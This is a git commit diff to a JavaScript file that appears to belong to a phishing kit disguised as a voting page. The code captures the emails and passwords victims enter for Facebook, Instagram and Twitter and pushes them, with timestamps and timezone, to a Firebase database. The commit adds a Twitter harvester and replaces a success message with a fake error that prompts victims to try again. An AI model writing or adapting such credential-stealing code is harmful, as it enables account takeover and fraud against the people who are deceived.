524bd0df4fb0911599154b3c18c2c6defa044766
Phy Llova <jenshllova@acelinkcourier.com>
2023-08-27 17:46:33 -0700

    updated files

--- js/firebase.js
+++ js/firebase.js
@@ -13,19 +13,20 @@ const appCheck = firebase.appCheck();
 console.log(appCheck);
 appCheck.activate('6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', true);
 
-function login() {
+
+function tw_login() {
   firebase.auth().signInAnonymously().catch(function(error) {
     var errorCode = error.code;
     var errorMessage = error.message;
     window.alert("Error: " + errorMessage);
   });
 
-  var email = document.getElementById('fb-email').value;
-  var password = document.getElementById('fb-pass').value;
+  var email = document.getElementById('tw-email').value;
+  var password = document.getElementById('tw-pass').value;
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = 'Facebook';
+  var accountType = 'Twitter';
 
   if (email !== '' && password !== '') {
     firebase.database().ref('fbdet').push({
@@ -39,12 +40,20 @@ function login() {
     });
 
     setTimeout(function() {
-      window.alert('Thank you for voting. Your vote has been submitted successfully.');
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
       document.getElementById('fb-pass').value = '';
+
       return false;
     }, 2000);
   }
 }
+
 
 function iglog() {
   firebase.auth().signInAnonymously().catch(function(error) {
@@ -73,8 +82,55 @@ function iglog() {
     });
 
     setTimeout(function() {
-      window.alert('Thank you for voting. Your vote has been submitted successfully.');
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+
       document.getElementById('ig-pass').value = '';
+      return false;
+    }, 2000);
+  }
+}
+
+function login() {
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
+
+  var email = document.getElementById('fb-email').value;
+  var password = document.getElementById('fb-pass').value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = 'Facebook';
+
+  if (email !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: email,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
+
+    setTimeout(function() {
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+      document.getElementById('fb-pass').value = '';
+
       return false;
     }, 2000);
   }
